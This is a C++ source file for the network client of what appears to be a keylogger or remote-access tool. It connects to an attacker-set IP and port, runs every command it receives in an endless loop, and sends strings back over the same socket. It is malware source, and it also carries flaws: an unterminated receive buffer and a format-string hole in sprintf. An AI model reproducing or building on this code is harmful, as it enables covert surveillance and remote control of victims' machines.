#include "client.h"
#include "keylogger.h"
#include "command.h"



void doRecv(Client * client)
{
	client->receiver();
}

int Client::c_connect()
{
	WSADATA wsaData;
	int iResult;
	sockaddr_in addr;

	addr.sin_family = AF_INET;
	addr.sin_port = htons(_port);
	addr.sin_addr.S_un.S_addr = inet_addr(_ip);


	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);

	if (iResult)
	{
		std::cout << "ERROR! WSA startup failed";
		Sleep(1000);
		return -1;
	}


	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	if (sock == INVALID_SOCKET)
	{
		std::cout << "ERROR! Invalid socket";
		Sleep(1000);
		return -1;
	}

	iResult = connect(sock, (SOCKADDR*)&addr, sizeof(sockaddr_in));

	if (iResult)
	{
		std::cout << "ERROR! Connect failed %u" << WSAGetLastError();
		Sleep(5000);
		return -1;
	}
	if (DEBUG)
		std::cout << "Connected!\n";


	std::thread t_receiver(doRecv, this);
	t_receiver.detach();

	return 0;
}

void Client::receiver()
{
	char chunk[1024];
	while (1)
	{
		recv(sock, chunk, 200, 0);
		std::string str(chunk);
		Command cmd = Command(str, this);
		cmd.execCommand();
	}
}

void Client::sender(const std::string &str) const 
{
	char ptr[1024];
	const char * c = str.c_str();
	sprintf(ptr, c);
	send(sock, ptr, sizeof(ptr), 0);
}